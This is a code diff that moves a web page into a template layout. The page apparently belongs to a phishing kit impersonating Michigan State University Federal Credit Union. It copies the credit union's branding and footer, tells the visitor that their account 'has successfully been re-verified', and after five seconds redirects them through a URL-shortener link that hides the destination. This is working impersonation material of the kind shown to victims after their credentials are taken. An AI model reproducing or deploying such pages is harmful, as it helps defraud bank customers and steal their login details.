@@ -1,69 +1,23 @@
-<!DOCTYPE html>
-<html lang="en">
+@layout('layouts.app')
 
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Login</title>
-  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.js"></script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="header mobile-header">
-      <div class="cb-logo-container">
-        <a href="https://www.msufcu.org/">
-          <img src="/img/logo.svg" class="cb-logo">
-          <img src="/img/logo-small.svg" class="cb-logo-small">
-        </a>
-      </div>
-
-      <h4 class="cb-title">ComputerLine</h4>
-    </div>
-
-    <div class="main">
-      <div class="form-container cb-complete">
-        <div style="max-width: 333px;margin-top: 50px;margin-bottom:150px;text-align:center;">
-          <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="https://www.w3.org/2000/svg">
-            <circle cx="32" cy="32" r="32" fill="#62CF66"></circle>
-            <path fill-rule="evenodd" clip-rule="evenodd" d="M28.2514 44.0347C27.4541 44.9285 26.0553 44.9259 25.2614 44.0291L14.5907 31.9753C14.151 31.4787 14.3078 30.6995 14.9054 30.4116L15.3589 30.1931C15.686 30.0354 16.0729 30.0675 16.3695 30.2769L25.0794 36.423C25.8341 36.9556 26.8554 36.902 27.5502 36.2934L47.6139 18.7212C47.9155 18.4571 48.3457 18.3986 48.7068 18.5726L49.0901 18.7573C49.689 19.0458 49.8448 19.8277 49.4023 20.3238L28.2514 44.0347Z" fill="white"></path>
-          </svg>
-          <h3>Verification Complete</h3>
-          <p>Your account has successfully been re-verified. You will be redirected back to our homepage shortly.</p>
-        </div>  
-      </div>
-    </div>
-
-    <div class="footer">
-      <div class="footer-text">
-        <p>
-          <strong>Michigan State University Federal Credit Union</strong> savings are Federally insured to at least $250,000 by the <a href="https://www.ncua.gov/">NCUA</a> and backed by the full faith and credit of the United States Government. APR = Annual Percentage Rate. APY = Annual Percentage Yield. <a href="https://www.msufcu.org/disclosures/?expand=privacy_policy#privacy_policy">View our Privacy Policy</a> and
-          read our <a href="https://media.msufcu.org/publicsites/publicsite/documents/u2slfliv46vtlzftrvw1.pdf">disclaimer</a> regarding links to other sites.
-        </p>
-        <div class="copyright">
-          Copyright © 2023 Michigan State University Federal Credit Union All Rights Reserved.
-        </div>
-      </div>
-
-      <div>
-        <a href="https://www.ncua.gov/">
-          <img src="/img/ncua.gif">
-        </a>
-      </div>
-
-      <div>
-        <img src="/img/ehl.png">
-      </div>
-    </div>
+@section('content')
+<div class="cb-login-form cb-loginFormArea">
+  <div style="margin-top: 50px;margin-bottom:150px;text-align:center;">
+    <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="https://www.w3.org/2000/svg">
+      <circle cx="32" cy="32" r="32" fill="#62CF66"></circle>
+      <path fill-rule="evenodd" clip-rule="evenodd" d="M28.2514 44.0347C27.4541 44.9285 26.0553 44.9259 25.2614 44.0291L14.5907 31.9753C14.151 31.4787 14.3078 30.6995 14.9054 30.4116L15.3589 30.1931C15.686 30.0354 16.0729 30.0675 16.3695 30.2769L25.0794 36.423C25.8341 36.9556 26.8554 36.902 27.5502 36.2934L47.6139 18.7212C47.9155 18.4571 48.3457 18.3986 48.7068 18.5726L49.0901 18.7573C49.689 19.0458 49.8448 19.8277 49.4023 20.3238L28.2514 44.0347Z" fill="white"></path>
+    </svg>
+    <h3>Verification Complete</h3>
+    <p>Your account has successfully been re-verified. You will be redirected back to our homepage shortly.</p>
   </div>
+</div>
 
-  <script src="/js/main.js"></script>
-  <script>
-    setTimeout(() => {
-      window.location.href = 'https://t.ly/pWMo';
-    }, 5000)
-  </script>
-</body>
+@endsection
+
+@section('script')
+<script>
+  setTimeout(() => {
+    window.location.href = 'https://t.ly/2CHH';
+  }, 5000)
+</script>
+@endsection
